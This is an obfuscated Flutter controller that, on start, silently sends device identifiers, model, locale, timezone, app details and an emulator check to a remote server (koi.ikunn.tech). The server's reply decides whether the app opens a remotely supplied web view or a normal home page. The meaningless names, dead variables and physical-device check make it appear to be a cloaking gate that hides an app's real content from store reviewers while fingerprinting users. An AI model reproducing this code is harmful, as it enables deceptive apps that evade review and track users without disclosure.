import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var catjxbwp = RxBool(false);
  var xhzoaw = RxBool(true);
  var tirn = RxString("");
  var rozella = RxBool(false);
  var kunde = RxBool(true);
  final lucrti = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    axki();
  }


  Future<void> axki() async {

    rozella.value = true;
    kunde.value = true;
    xhzoaw.value = false;

    lucrti.post("https://koi.ikunn.tech/aulhiwkc",data: await pbekyx()).then((value) {
      var czwxypkq = value.data["czwxypkq"] as String;
      var lmng = value.data["lmng"] as bool;
      if (lmng) {
        tirn.value = czwxypkq;
        wilton();
      } else {
        hettinger();
      }
    }).catchError((e) {
      xhzoaw.value = true;
      kunde.value = true;
      rozella.value = false;
    });
  }

  Future<Map<String, dynamic>> pbekyx() async {
    final DeviceInfoPlugin enhzs = DeviceInfoPlugin();
    PackageInfo kmzprfyb_fjhea = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var efnqlvj = Platform.localeName;
    var oeca_gK = currentTimeZone;

    var oeca_OxChBMaW = kmzprfyb_fjhea.packageName;
    var oeca_lIzoKd = kmzprfyb_fjhea.version;
    var oeca_FTu = kmzprfyb_fjhea.buildNumber;

    var oeca_RPlVicHg = kmzprfyb_fjhea.appName;
    var zelmaBernier = "";
    var oeca_PNjqiC  = "";
    var oeca_Jp = "";
    var keatonBecker = "";
    var oeca_JOGVBKb = "";
    var burniceMaggio = "";
    var colbyReichert = "";
    var bobbyGerhold = "";
    var julianMarquardt = "";


    var oeca_oTSz = "";
    var oeca_kRxcmtf = false;

    if (GetPlatform.isAndroid) {
      oeca_oTSz = "android";
      var klfevhpica = await enhzs.androidInfo;

      oeca_Jp = klfevhpica.brand;

      oeca_JOGVBKb  = klfevhpica.model;
      oeca_PNjqiC = klfevhpica.id;

      oeca_kRxcmtf = klfevhpica.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      oeca_oTSz = "ios";
      var hfslqb = await enhzs.iosInfo;
      oeca_Jp = hfslqb.name;
      oeca_JOGVBKb = hfslqb.model;

      oeca_PNjqiC = hfslqb.identifierForVendor ?? "";
      oeca_kRxcmtf  = hfslqb.isPhysicalDevice;
    }
    var res = {
      "oeca_RPlVicHg": oeca_RPlVicHg,
      "oeca_FTu": oeca_FTu,
      "oeca_OxChBMaW": oeca_OxChBMaW,
      "julianMarquardt" : julianMarquardt,
      "oeca_lIzoKd": oeca_lIzoKd,
      "oeca_JOGVBKb": oeca_JOGVBKb,
      "oeca_Jp": oeca_Jp,
      "oeca_PNjqiC": oeca_PNjqiC,
      "oeca_gK": oeca_gK,
      "burniceMaggio" : burniceMaggio,
      "efnqlvj": efnqlvj,
      "oeca_oTSz": oeca_oTSz,
      "zelmaBernier" : zelmaBernier,
      "keatonBecker" : keatonBecker,
      "colbyReichert" : colbyReichert,
      "oeca_kRxcmtf": oeca_kRxcmtf,
      "bobbyGerhold" : bobbyGerhold,

    };
    return res;
  }

  Future<void> hettinger() async {
    Get.offAllNamed("/root-page");
  }

  Future<void> wilton() async {
    Get.offAllNamed("/pet-bing");
  }

}
